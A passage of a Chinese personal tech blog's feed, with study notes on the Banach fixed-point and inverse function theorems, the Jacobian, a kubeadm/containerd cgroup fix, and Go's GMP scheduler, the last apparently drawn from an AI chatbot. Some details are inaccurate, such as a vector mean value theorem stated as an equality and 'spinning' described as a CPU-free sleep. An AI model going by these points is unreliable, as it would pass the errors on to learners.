收敛到 $\sqrt{2}$，但 $\sqrt{2} \notin \mathbb{Q}$。这说明 $\mathbb{Q}$ 不完备。</li></ul><hr><h3 id="1-3-完备性的意义">1.3 完备性的意义</h3><ul><li>在一个<strong>完备度量空间</strong>中，任何柯西序列一定会收敛，并且其极限点一定在空间 $S$ 内。</li><li>如果一个空间不是完备的，则可能存在柯西序列，其极限点落在 $S$ 外部（即序列离开了原来的空间）。</li></ul><hr><h1>预备知识 - Banach 不动点定理</h1><h3 id="定理陈述">定理陈述</h3><p>设 $(X, d)$ 是一个完备度量空间，$T: X \to X$ 是一个<strong>压缩映射</strong>，即存在常数 $0 \leq k &lt; 1$，使得对于任意 $x, y \in X$，有：<br>$$<br>d(T(x), T(y)) \leq k \cdot d(x, y).<br>$$<br>那么，$T$ 在 $X$ 中存在唯一的不动点 $x^*$，即 $T(x^*)=x^*$。</p><hr><h3 id="符号解释">符号解释</h3><ol><li>$X$：一个集合，表示度量空间中的元素。</li><li>$d$：度量函数，表示 $X$ 中两个元素之间的距离，满足非负性、对称性和三角不等式。</li><li><strong>完备度量空间</strong>：度量空间 $(X, d)$ 是完备的，如果其中的所有柯西序列都收敛于 $X$ 中的某个点。</li><li>$T$：映射（函数），将 $X$ 中的元素映射到 $X$ 中的另一个元素。</li><li><strong>压缩映射</strong>：映射 $T$ 是压缩的，如果存在常数 $0 \leq k &lt; 1$，使得 $T$ 将任意两点之间的距离缩小至少 $k$ 倍。</li><li><strong>不动点</strong>：点 $x^*$ 是 $T$ 的不动点，如果 $T(x^*) = x^*$。</li></ol><hr><h3 id="证明">证明</h3><h4 id="1-构造序列：">1. 构造序列：</h4><p>从任意一点 $x_0 \in X$ 开始，构造序列 ${x_n}$，其中：<br>$$<br>x_{n+1} = T(x_n),<br>$$<br>即每次将当前点通过映射 $T$ 映射到下一个点。</p><h4 id="2-证明序列是柯西序列：">2. 证明序列是柯西序列：</h4><p>对于任意 $n, m \in \mathbb{N}$（假设 $n &gt; m$），有：<br>$$<br>d(x_n, x_m) \leq d(x_n, x_{n-1}) + d(x_{n-1}, x_{n-2}) + \dots + d(x_{m+1}, x_m).<br>$$<br>由于 $T$ 是压缩映射，有：<br>$$<br>d(x_{i+1}, x_i) = d(T(x_i), T(x_{i-1})) \leq k \cdot d(x_i, x_{i-1}).<br>$$<br>递推可得：<br>$$<br>d(x_{i+1}, x_i) \leq k^i \cdot d(x_1, x_0).<br>$$<br>由于 $0 \leq k &lt; 1$，最终 $d(x_n, x_m)$ 收敛到 0，故 ${x_n}$ 是柯西序列。</p><h4 id="3-完备性保证极限存在：">3. 完备性保证极限存在：</h4><p>因为 $X$ 是完备的，柯西序列 ${x_n}$ 收敛于某个点 $x^* \in X$。注意，定理条件中给出了 $T$ 是 $X$ 到 $X$ 的映射。</p><h4 id="4-证明-x-是不动点：">4. 证明 $x^*$ 是不动点：</h4><p>由于 $T$ 是连续的（压缩映射是连续的），有：<br>$$<br>T(x^*) = T\left(\lim_{n \to \infty} x_n\right) = \lim_{n \to \infty} T(x_n) = \lim_{n \to \infty} x_{n+1} = x^*.<br>$$<br>因此，$x^*$ 是 $T$ 的不动点。</p><h4 id="5-唯一性：">5. 唯一性：</h4><p>假设存在另一个不动点 $y^*$，即 $T(y^*) = y^*$，则：<br>$$<br>d(x^*, y^*) = d(T(x^*), T(y^*)) \leq k \cdot d(x^*, y^*).<br>$$<br>由于 $0 \leq k &lt; 1$，只有当 $d(x^*, y^*) = 0$ 时成立，即 $x^* = y^*$。因此，不动点唯一。</p><hr><h3 id="总结">总结</h3><ul><li><strong>Banach 不动点定理</strong>表明，在完备度量空间中，压缩映射存在唯一的不动点。</li><li>证明的关键是通过构造序列并利用压缩映射的性质证明序列收敛，然后验证极限点是不动点。</li><li>该定理在数值分析、微分方程和优化等领域有广泛应用。</li></ul><hr><h1>逆函数定理的证明</h1><h3 id="定理内容">定理内容</h3><p>给定一个连续可微函数 $f: \mathbb{R}^n \to \mathbb{R}^n$，若在某一点 $x_0 \in \mathbb{R}^n$，该函数的雅可比矩阵 $J_f(x_0)$ 是满秩的（即 $\det(J_f(x_0)) \neq 0$，雅可比矩阵可逆），那么可以得出以下结论：</p><ol><li><strong>局部可逆性</strong>：<br>在点 $x_0$ 的某个小邻域内，$f$ 是双射（即每个点都有唯一的像，并且每个像值对应唯一的原点），即 $f$ 在该邻域内有逆函数 $f^{-1}$。</li><li><strong>逆函数的性质</strong>：<br>逆函数 $f^{-1}$ 也是连续可微的（$C^1$），并且其导数由雅可比矩阵的逆给出：<br>$$<br>J_{f^{-1}}(f(x)) = [J_f(x)]^{-1},<br>$$<br>对于 $x$ 在邻域内。</li></ol><p>总结来说，如果 $J_f(x_0)$ 是可逆的，则 $f$ 在 $x_0$ 的邻域内具有光滑的逆函数。</p><p>注：</p><ul><li><p>其实当时学到这里是有一个疑问，不知道为什么需要前面预备知识的铺垫。因为雅可比矩阵可逆，不就已经说明了是有逆函数的，还需要证明吗？</p></li><li><p>但雅可比矩阵是泰勒公式的一阶展开，“一阶可逆”只能保证在无穷小邻域接近可逆，但是逆函数定理说的局部，并不是指无穷小（infinitesimal）邻域；而是“存在某个非零半径的开邻域”，通常记为 $U$。在这个$U$里，$f$关于 $x0$ 是双射（即一一对应），并且逆函数还是光滑/连续可微的。</p></li><li><p>换句话说这里是在高阶项的扰动不会&quot;压倒&quot;线性项：在足够小但是非无穷小邻域接近可逆的范围内，线性项占主导。（线性部分 + 小扰动 = 整体可逆）</p></li></ul><hr><h3 id="直观思路">直观思路</h3><p>逆函数 $f^{-1}$ 的基本定义是：给定 $y \in \mathbb{R}^n$，我们需要找到唯一的 $x \in \mathbb{R}^n$，使得 $f(x) = y$。<br>若 $f$ 在某点 $x_0$ 处是可逆的（即雅可比矩阵 $J_f(x_0)$ 可逆），可以通过近似线性化的方法（泰勒展开），证明每一个 $y$ 都有一个唯一解 $x$ 使 $f(x) = y$，而这个解可以通过压缩映射定理来找到。</p><hr><h3 id="详细证明">详细证明</h3><h4 id="（1）定义辅助映射：">（1）定义辅助映射：</h4><p>设 $y \in \mathbb{R}^n$ 是任意的目标值，并且我们希望找到 $x \in \mathbb{R}^n$，使得 $f(x) = y$。令：<br>$$<br>T(x) = x - J_f(x_0)^{-1} \cdot (f(x) - y),<br>$$<br>其中 $J_f(x_0)$ 是 $f$ 在点 $x_0$ 的雅可比矩阵。</p><p>需要证明：</p><ol><li>映射 $T(x)$ 是一个压缩映射；</li><li>压缩映射 $T(x)$ 的不动点 $x^*$ 满足 $f(x^*) = y$。</li></ol><hr><h4 id="（2）泰勒展开（局部线性化）：">（2）泰勒展开（局部线性化）：</h4><p>由 $f(x)$ 在点 $x_0$ 的泰勒展开（在一阶导数处截断）：<br>$$<br>f(x) \approx f(x_0) + J_f(x_0) \cdot (x - x_0).<br>$$<br>令 $\Delta x = x - x_0$，有：<br>$$<br>f(x) \approx f(x_0) + J_f(x_0) \cdot \Delta x.<br>$$<br>设 $y = f(x)$，可以通过线性化近似得到：<br>$$<br>x \approx x_0 + J_f(x_0)^{-1} \cdot (y - f(x_0)).<br>$$<br>这表明，对于充分小的扰动 $y - f(x_0)$，可以从初始点 $x_0$ 通过迭代来逐步接近解。</p><p>注：已知$y$找到对应$x$，通过迭代来求解。这里核心是要正明迭代可以收敛，于是下面构造压缩映射。</p><hr><h4 id="（3）设计压缩映射：">（3）设计压缩映射：</h4><p>选定 $x_0$ 邻域内的点 $x$ 和目标值 $y$，定义迭代映射：<br>$$<br>T(x) = x - J_f(x_0)^{-1} \cdot (f(x) - y).<br>$$<br>我们需要证明 $T(x)$ 是压缩映射。注意到：<br>$$<br>T(x) - T(z) = x - z - J_f(x_0)^{-1} \cdot (f(x) - f(z)).<br>$$<br>利用 $f(x)$ 的连续可微性，有：<br>$$<br>f(x) - f(z) = J_f( c ) \cdot (x - z),<br>$$<br>注：拉格朗日中值定理，$c$是拉格朗日中值。<br>其中 $J_f©$ 是某个点 $c \in \mathbb{R}^n$ 的雅可比矩阵。代入得到：<br>$$<br>T(x) - T(z) = (I - J_f(x_0)^{-1} \cdot J_f( c )) \cdot (x - z).<br>$$<br>若 $J_f(x_0)$ 足够接近于 $J_f( c )$（在 $x_0$ 的邻域内），矩阵 $I - J_f(x_0)^{-1} J_f( c )$ 的范数小于 1，因此 $T$ 是压缩映射。</p><hr><h4 id="（4）应用压缩映射定理：">（4）应用压缩映射定理：</h4><p>根据压缩映射定理，$T(x)$ 有唯一的不动点 $x^*$。对于该不动点，有：<br>$$<br>T(x^*) = x^* \implies x^* - J_f(x_0)^{-1} \cdot (f(x^*) - y) = x^*,<br>$$<br>化简得到：<br>$$<br>f(x^*) = y.<br>$$<br>因此，$x^*$ 是方程 $f(x) = y$ 的唯一解。</p><hr><h4 id="（5）局部可逆性与光滑性：">（5）局部可逆性与光滑性：</h4><p>上述过程说明 $f$ 在 $x_0$ 的某邻域是局部可逆的，并且 $f^{-1}$ 是由连续迭代构造的，因此它是光滑（$C^1$）的。</p>]]></content>
    
    
    <summary type="html">Inverse function theorem</summary>
    
    
    
    
    <category term="ML" scheme="https://cl0und.xyz/tags/ML/"/>
    
    <category term="Math" scheme="https://cl0und.xyz/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>ML的数学基石-雅可比矩阵（Jacobian Matrix)</title>
    <link href="https://cl0und.xyz/2025/03/04/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9B%85%E5%8F%AF%E6%AF%94%E7%9F%A9%E9%98%B5%EF%BC%88Jacobian-Matrix%EF%BC%89/"/>
    <id>https://cl0und.xyz/2025/03/04/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9B%85%E5%8F%AF%E6%AF%94%E7%9F%A9%E9%98%B5%EF%BC%88Jacobian-Matrix%EF%BC%89/</id>
    <published>2025-03-04T15:28:04.000Z</published>
    <updated>2025-05-25T09:28:44.866Z</updated>
    
    <content type="html"><![CDATA[<h1>定义与基本解释</h1><p>雅可比矩阵是描述多元函数在某一点处的局部线性近似（即全导数）的矩阵形式。它是多变量微积分中非常重要的概念，用于研究函数的变化率、方向导数以及映射的局部特性。</p><p>一般定义：<br>设 $ f: \mathbb{R}^n \to \mathbb{R}^m $ 是从 $ \mathbb{R}^n $ 映射到 $ \mathbb{R}^m $ 的一个函数：</p><p>$ f(x_1, x_2, \dots, x_n) = \begin{bmatrix}<br>f_1(x_1, x_2, \dots, x_n) \\<br>f_2(x_1, x_2, \dots, x_n)\\\<br>\vdots \\<br>f_m(x_1, x_2, \dots, x_n)  \\<br>\end{bmatrix}, $</p><p>其中 $ f_1, f_2, \dots, f_m $ 是 $ f $ 的分量函数。</p><p>在点 $ X = (x_1, x_2, \dots, x_n) $ 处，函数 $ f $ 的雅可比矩阵  $ J_f(X) $ 是一个 $ m \times n $的矩阵，定义为：</p><p>$ J_f(X) =<br>\begin{bmatrix}<br>\frac{\partial f_1}{\partial x_1} &amp; \frac{\partial f_1}{\partial x_2} &amp; \cdots &amp; \frac{\partial f_1}{\partial x_n} \\<br>\frac{\partial f_2}{\partial x_1} &amp; \frac{\partial f_2}{\partial x_2} &amp; \cdots &amp; \frac{\partial f_2}{\partial x_n} \\<br>\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial f_m}{\partial x_1} &amp; \frac{\partial f_m}{\partial x_2} &amp; \cdots &amp; \frac{\partial f_m}{\partial x_n}  \\<br>\end{bmatrix}. $</p><p>相当于 $ J_f(X) $ 的第 $ (i,j) $ 项是函数 $ f_i $ 对变量 $ x_j $ 的偏导数：</p><p>$ [J_f(X)]_{i,j} = \frac{\partial f_i}{\partial x_j}. $</p><hr><h1>特殊情况</h1><ul><li>如果 $ f $ 是标量函数（即 $ m = 1 $ ），那么雅可比矩阵是一个  $ 1 \times n $ 的行向量，称为函数 $ f $的 梯度向量 。</li><li>如果 $ f $ 是从 $ \mathbb{R}^n \to \mathbb{R}^n $ 的向量函数（即 $ n = m $ ），则雅可比矩阵是一个方阵，常被用于研究  $ f $在点处的可逆性等性质。</li></ul><hr><h1>几何意义</h1><ol><li><strong>局部变化率与线性近似</strong>：雅可比矩阵定义了 $ f $ 在某一点的<strong>线性近似</strong> 。从泰勒展开的角度来看，如果 $ \Delta $ 是自变量的小增量，那么：   $ f(X + \Delta X) \approx f(X) + J_f(X) \cdot \Delta X. $  其中 $ J_f(X) \cdot \Delta   $ 表示由雅可比矩阵定义的线性部分。</li><li><strong>方向导数</strong>：如果方向单位向量为 $ v \in \mathbb{R} $，那么 $ J_f(X) $ 是函数$ f $沿着方向 $ v $的变化率。</li><li><strong>几何映射的局部行为</strong>：雅可比矩阵描述了映射 $f$ 在一点处的<strong>局部伸缩、旋转或反射</strong> 的性质：<ol><li>如果 $ n = $ 且雅可比行列式（即 $ \det(J_f(X) $）不为 0，则 $ f $ 在这一点处是局部的双射。</li><li>如果雅可比行列式为 0，则 $ f $ 在这一点可能是奇异的（不可逆）。</li></ol></li></ol><hr><h1>计算实例</h1><h2 id="示例-1：标量情况">示例 1：标量情况</h2><p>函数 $ f(x,y) = x^2 + y^2 $，其雅可比矩阵是：</p><p>$ J_f(x,y) = \begin{bmatrix}<br>\frac{\partial f}{\partial x} &amp; \frac{\partial f}{\partial y}<br>\end{bmatrix}<br>= \begin{bmatrix}<br>2x &amp; 2y<br>\end{bmatrix}. $</p><h2 id="示例-2：向量情况">示例 2：向量情况</h2><p>定义 $ f(x,y,z) = \begin{bmatrix} x^2y \\ yz \\ e^x+z \end{bmatrix} $，则雅可比矩阵为：</p><p>$ J_f(x,y,z) =<br>\begin{bmatrix}<br>\frac{\partial f_1}{\partial x} &amp; \frac{\partial f_1}{\partial y} &amp; \frac{\partial f_1}{\partial z} \\<br>\frac{\partial f_2}{\partial x} &amp; \frac{\partial f_2}{\partial y} &amp; \frac{\partial f_2}{\partial z} \\<br>\frac{\partial f_3}{\partial x} &amp; \frac{\partial f_3}{\partial y} &amp; \frac{\partial f_3}{\partial z}<br>\end{bmatrix}  =  \begin{bmatrix}<br>2xy &amp; x^2 &amp; 0 \\<br>0 &amp; z &amp; y \\<br>e^x &amp; 0 &amp; 1  \\<br>\end{bmatrix}. $</p>]]></content>
    
    
    <summary type="html">Jacobian Matrix</summary>
    
    
    
    
    <category term="ML" scheme="https://cl0und.xyz/tags/ML/"/>
    
    <category term="Math" scheme="https://cl0und.xyz/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Fix CrashLoopBackOff when using kubeadm to init cluster</title>
    <link href="https://cl0und.xyz/2025/01/12/Fix-CrashLoopBackOff-when-using-kubeadm-to-init-cluster/"/>
    <id>https://cl0und.xyz/2025/01/12/Fix-CrashLoopBackOff-when-using-kubeadm-to-init-cluster/</id>
    <published>2025-01-12T09:13:53.000Z</published>
    <updated>2025-01-12T09:19:17.736Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="问题的解决">问题的解决</h2><p>这个问题，问AI一直没有解决，简中互联也没搜到。最后再gitlab issue里面找到答案。因此快速记一下修复原理。</p><p>解决问题的issue在</p><p><a href="https://github.com/kubernetes/kubeadm/issues/2833">https://github.com/kubernetes/kubeadm/issues/2833</a></p><p><a href="https://github.com/etcd-io/etcd/issues/13670">https://github.com/etcd-io/etcd/issues/13670</a></p><p>问题的特征是用kubeadm init启动，像issue里面会遇到CrashLoopBackOff</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@student-VMware-Virtual-Platform:/home/student/Desktop# kubectl get pods -n kube-system</span><br><span class="line">NAME                                                      READY   STATUS             RESTARTS        AGE</span><br><span class="line">coredns-668d6bf9bc-mc5mn                                  0/1     Pending            0               119s</span><br><span class="line">coredns-668d6bf9bc-sd84z                                  0/1     Pending            0               119s</span><br><span class="line">etcd-student-vmware-virtual-platform                      1/1     Running            2 (2m53s ago)   2m57s</span><br><span class="line">kube-apiserver-student-vmware-virtual-platform            1/1     Running            2 (2m23s ago)   2m57s</span><br><span class="line">kube-controller-manager-student-vmware-virtual-platform   1/1     Running            4 (2m53s ago)   2m57s</span><br><span class="line">kube-proxy-7k6hq                                          1/1     Running            2 (41s ago)     2m</span><br><span class="line">kube-scheduler-student-vmware-virtual-platform            0/1     CrashLoopBackOff   4 (22s ago)     2m57s</span><br><span class="line">root@student-VMware-Virtual-Platform:/home/student/Desktop# </span><br></pre></td></tr></table></figure><p>然后慢慢的整个集群在挂掉，使用不了kubectl。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@student-VMware-Virtual-Platform:/home/student/Desktop/lk8s# kubectl get pods -n kube-system  </span><br><span class="line">The connection to the server 192.168.220.128:6443 was refused - did you specify the right host or port?</span><br></pre></td></tr></table></figure><p>看apiserver的容器日志发现它就是收到了信号被关了，也没有error错误。</p><p>解决方法是在/etc/containerd/config.toml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/containerd/</span><br><span class="line">vim /etc/containerd/config.toml</span><br></pre></td></tr></table></figure><p>添加配置</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version</span> = <span class="number">2</span></span><br><span class="line"><span class="section">[plugins]</span></span><br><span class="line">  <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;]</span></span><br><span class="line">   <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd]</span></span><br><span class="line">      <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes]</span></span><br><span class="line">        <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc]</span></span><br><span class="line">          <span class="attr">runtime_type</span> = <span class="string">&quot;io.containerd.runc.v2&quot;</span></span><br><span class="line">          <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc.options]</span></span><br><span class="line">            <span class="attr">SystemdCgroup</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="产生问题的原因">产生问题的原因</h2><p>根据issue的里面指导可以看到k8s文档，在linux下又两个cgroup driver，一个是cgroupfs，一个是systemd。</p><p>Kubelet和容器运行时必须要使用一样的cgroup driver才可以。</p><blockquote><p>It’s critical that the kubelet and the container runtime use the same cgroup driver and are configured the same.</p></blockquote><p>根据文档所说kubelet默认情况下用的是cgroupfs</p><p><img src="image1.png" alt=""></p><p>但是我这里使用kubeadm v1.32，默认是用的systemd</p><p><img src="image2.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/lib/kubelet/config.yaml | grep cgroupDriver</span><br></pre></td></tr></table></figure><p><img src="image3.png" alt=""></p><p>再看containerd配置，看到默认是cgroupfs而不是system</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">containerd config default &gt; /tmp/1.txt</span><br></pre></td></tr></table></figure><blockquote><p>systemd_cgroup = false</p><p>[plugins.“io.containerd.grpc.v1.cri”.containerd.runtimes.runc.options]<br>BinaryName = “”<br>CriuImagePath = “”<br>CriuPath = “”<br>CriuWorkPath = “”<br>IoGid = 0<br>IoUid = 0<br>NoNewKeyring = false<br>NoPivotRoot = false<br>Root = “”<br>ShimCgroup = “”<br>SystemdCgroup = false</p></blockquote><p>如文档所说，两套cgroup manager同时用会导致不稳定，需要修改runc的启动参数。</p><p><img src="image4.png" alt=""></p>]]></content>
    
    
    <summary type="html">kubeadm启动踩坑记录</summary>
    
    
    
    
    <category term="k8s" scheme="https://cl0und.xyz/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>与AI纸上谈兵-Go中I/O密集型需要设置P超过CPU核心数吗？</title>
    <link href="https://cl0und.xyz/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Go%E4%B8%ADI-O%E5%AF%86%E9%9B%86%E5%9E%8B%E9%9C%80%E8%A6%81%E8%AE%BE%E7%BD%AEP%E8%B6%85%E8%BF%87CPU%E6%A0%B8%E5%BF%83%E6%95%B0%E5%90%97%EF%BC%9F/"/>
    <id>https://cl0und.xyz/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Go%E4%B8%ADI-O%E5%AF%86%E9%9B%86%E5%9E%8B%E9%9C%80%E8%A6%81%E8%AE%BE%E7%BD%AEP%E8%B6%85%E8%BF%87CPU%E6%A0%B8%E5%BF%83%E6%95%B0%E5%90%97%EF%BC%9F/</id>
    <published>2025-01-04T03:39:55.000Z</published>
    <updated>2025-01-12T09:29:02.901Z</updated>
    
    <content type="html"><![CDATA[<h1>GO的GMP</h1><p>在 Go 语言中，GMP 是 Go 运行时调度器的核心模型，用于高效地管理并发任务（goroutine）的执行。GMP 分别代表：</p><ul><li>G（Goroutine）：Go 中的轻量级线程，表示一个独立的任务或协程。</li><li>M（Machine）：操作系统线程，Go 运行时通过 M 来执行 G。</li><li>P（Processor）：逻辑处理器，负责调度 G 到 M 上运行。</li></ul><p>GMP 模型的设计目的是为了高效利用多核 CPU，同时隐藏底层线程管理的复杂性，提供更高效的并发支持。</p><hr><h3 id="GMP-模型的具体含义">GMP 模型的具体含义</h3><ol><li><p>G（Goroutine）</p><ol><li>Goroutine 是 Go 的核心并发单元，类似于协程。</li><li>每个 G 包含任务的执行上下文（如栈、程序计数器等）和调度信息。</li><li>G 是非常轻量级的，创建和销毁的开销远小于操作系统线程。</li></ol></li><li><p>M（Machine）</p><ol><li>M 是操作系统线程的抽象，负责执行 G。</li><li>M 直接与操作系统线程绑定，Go 运行时会动态创建或销毁 M，以适应程序的并发需求。</li><li>一个 M 在任意时刻只能绑定一个 P，且只能执行绑定的 P 中的 G。</li></ol></li><li><p>P（Processor）</p><ol><li>P 是逻辑处理器，负责调度 G 到 M 上运行。</li><li>P 的数量由 <code>GOMAXPROCS</code> 决定，表示程序可以并行运行的最大线程数。</li><li>P 维护一个本地的 G 队列，存储待执行的 Goroutine。</li><li>如果 P 的 G 队列为空，它可以从其他 P 的队列中窃取任务（work stealing）。</li></ol></li></ol><hr><h3 id="GMP-的工作流程">GMP 的工作流程</h3><ol><li><p>G 的创建</p><ol><li>当程序创建一个新的 Goroutine 时，G 会被放入某个 P 的本地队列中，等待被调度执行。</li></ol></li><li><p>P 调度 G</p><ol><li>P 从自己的本地队列中取出 G，并将其分配给绑定的 M 执行。</li><li>如果本地队列为空，P 会尝试从其他 P 的队列中窃取任务。</li></ol></li><li><p>M 执行 G</p><ol><li>M 负责实际执行 G 的代码。</li><li>如果 G 阻塞（如 I/O 操作），M 会将当前 G 挂起，并尝试执行其他 G。</li></ol></li><li><p>动态调整</p><ol><li>如果 G 的数量远超 M 的数量，Go 运行时会动态创建新的 M。</li><li>如果某些 M 长时间空闲，Go 运行时会销毁这些 M，以节省资源。</li></ol></li></ol><hr><h3 id="GMP-模型的优点">GMP 模型的优点</h3><ol><li><p>高效的并发支持</p><ol><li>Goroutine 是轻量级的，创建和切换的开销远小于操作系统线程。</li><li>GMP 模型通过逻辑处理器（P）和任务窃取机制，充分利用多核 CPU 的性能。</li></ol></li><li><p>自动调度</p><ol><li>Go 运行时自动管理 Goroutine 的调度，开发者无需手动管理线程。</li></ol></li><li><p>阻塞操作优化</p><ol><li>当 Goroutine 阻塞时，Go 运行时会将其挂起，并调度其他 Goroutine 执行，避免线程资源浪费。</li></ol></li></ol><h1>In the Go GMP model, does an IO-intensive application need to set the number of P greater than the number of CPU cores?</h1><p>No, an I/O-intensive application in Go’s GMP (Goroutine, Machine, Processor) model generally <em>does not</em> need to set <code>GOMAXPROCS</code> (the number of P’s) greater than the number of CPU cores. In fact, doing so can often be detrimental to performance. Here’s why:</p><ul><li><strong>Concurrency vs. Parallelism:</strong> Go’s strength lies in concurrency, not necessarily parallelism. Concurrency means handling multiple tasks at the same time, while parallelism means executing multiple tasks simultaneously. I/O-bound operations spend most of their time waiting for external resources (disk, network, etc.). During this waiting time, the OS puts the goroutine to sleep. Another goroutine can then run on the same OS thread (and thus, the same P). Increasing the number of P’s won’t make the I/O faster; it just adds overhead for context switching between P’s.</li><li><strong>OS Thread Management:</strong> The P’s are mapped to OS threads. Having more P’s than CPU cores means the OS scheduler will be constantly switching between threads, leading to context switching overhead.() This overhead can outweigh any potential gains, especially in I/O-bound applications where the CPU is not the bottleneck.</li><li><strong>Blocking System Calls:</strong> When a goroutine makes a blocking system call (like reading from a file or network socket), the associated OS thread is blocked. However, the Go runtime uses a technique called “network poller” to handle network I/O efficiently. For file I/O, if the runtime detects a long blocking operation, it can detach the M (OS thread) from the P, allowing other goroutines to run on that P. When the I/O operation completes, the M is reattached. This mechanism minimizes blocking and context switching.</li></ul><h1>I/O时会发生什么？</h1><p><strong>网络 I/O：</strong> Go runtime 使用非阻塞的 I/O 模型和 epoll/kqueue 等操作系统提供的 I/O 多路复用机制（network poller）。当一个 G 发起网络 I/O 操作时，通常不会阻塞 M。而是将 I/O 请求交给操作系统，然后该 G 会被放入网络轮询器(network poller)中等待 I/O 事件。P 可以继续调度其他 G 在 M 上执行。当 I/O 事件发生时，runtime 会收到通知，并将相应的 G 重新放回 P 的 runqueue 中，等待调度。</p><p><strong>文件 I/O (以及其他可能长时间阻塞的系统调用)：</strong> 对于文件 I/O，如果操作是阻塞的（例如读取大文件），则情况会略有不同。在这种情况下：</p><ul><li>如果 runtime 判定此 I/O 操作会长时间阻塞，会将  <strong>M 从 P 上解绑</strong> 。这个过程叫做 <code>sysmon</code> 会检测，当一个 M 阻塞时间过长，sysmon会把这个M和P分离。</li><li>此时，P 就变成空闲状态了，它可以寻找其他的 M 来绑定，或者创建新的 M。这样，其他的 G 就有机会在这个 P 上继续执行，不会因为某个 G 的文件 I/O 操作而导致整个 P 阻塞。</li><li>当 I/O 操作完成时，被解绑的 M 会尝试重新获取一个 P。如果此时有空闲的 P，则直接绑定；如果没有空闲的 P，则 M 会进入一个空闲 M 列表等待 P。</li></ul><h1>更多<strong>解绑细节</strong></h1><p>当 <code>sysmon</code> 将 M 和 P 解绑后，P 不会立即创建新的 M。P 的行为如下：</p><ol><li><strong>检查本地 runqueue：</strong> P 首先会检查其本地的 runqueue (runq) 中是否还有待执行的 G。如果 runqueue 不为空，P 会选择一个 G，并尝试找到一个 <em>空闲的 M</em> 来执行该 G。</li><li><strong>寻找空闲 M：</strong> P 会首先查看是否有空闲的 M 列表 (idle M list)。如果存在空闲的 M，P 会直接与该 M 绑定，然后将 runqueue 中的 G 调度到该 M 上执行。</li><li><strong>创建新的 M（如果需要）：</strong> 如果没有空闲的 M 可用，且 P 的 runqueue 不为空，P <em>才会</em> 创建一个新的 M，并与该 M 绑定，然后将 runqueue 中的 G 调度到该 M 上执行。</li><li><strong>窃取 (work stealing)：</strong> 如果 P 的 runqueue 也为空，P 会尝试从其他 P 的 runqueue 中 <em>窃取</em> 一部分 G。这是 Go 调度器实现负载均衡的重要机制。如果窃取成功，P 就会有待执行的 G，并按照上述步骤寻找或创建 M 来执行。</li><li><strong>进入休眠 (spinning)：</strong> 如果 P 的 runqueue 为空，且无法从其他 P 窃取到 G，P 会进入休眠状态 (spinning)。此时 P 不会消耗 CPU 资源，直到有新的 G 需要执行时才会被唤醒。</li></ol><h1>还有一个细节</h1><p>sysmon是发现它是文件i/o所以分离M和P。还是因为他syscall时间太长所以分离。注意这两个的区别，一个是提前就发现了，一个是超时了才发现。</p><ol><li><strong>不是提前发现是文件 I/O</strong></li></ol><p>Go runtime 并不会在 G 执行系统调用 <em>之前</em> 就判断这是不是文件 I/O，然后采取特殊处理。实际上，runtime 对所有类型的阻塞系统调用都采用相同的处理方式，包括文件 I/O、网络 I/O（在某些情况下，虽然通常是异步的，但也可能发生阻塞）、以及其他用户自定义的阻塞系统调用。</p><p>这意味着：</p><ul><li>runtime 没有维护一个“文件 I/O 特殊处理”的列表或逻辑。</li><li>runtime 不会区分系统调用的类型。</li></ul><ol start="2"><li><strong>是 syscall 时间太长才分离</strong></li></ol><p><code>sysmon</code> 的核心工作是  <em>监控</em> ，而不是  <em>预判</em> 。它通过周期性地检查所有 M 的状态来判断是否有 M 阻塞在系统调用上的时间过长。这个“过长”的阈值通常是 10ms。</p><p>具体流程如下：</p><ol><li>G 执行一个系统调用。</li><li>runtime 将该 G 的状态标记为 <code>_Gsyscall</code>。</li><li>该 G 所在的 M 进入阻塞状态，等待系统调用完成。</li><li><code>sysmon</code> 周期性地检查所有 M 的状态。</li><li>如果 <code>sysmon</code> 发现某个 M 的状态为 <code>_Gsyscall</code>，并且持续时间超过阈值（10ms），它就认为该 M 正在执行长时间阻塞的系统调用。</li><li><code>sysmon</code> 将该 M 与其绑定的 P 解绑。</li></ol><p>因此，分离 M 和 P 的  <em>根本原因是超时</em> ，而不是提前知道是哪种类型的系统调用。</p><h1>参考</h1><p>Google Gemini2.0</p>]]></content>
    
    
    <summary type="html">GMP model</summary>
    
    
    
    
    <category term="talking big" scheme="https://cl0und.xyz/tags/talking-big/"/>
    
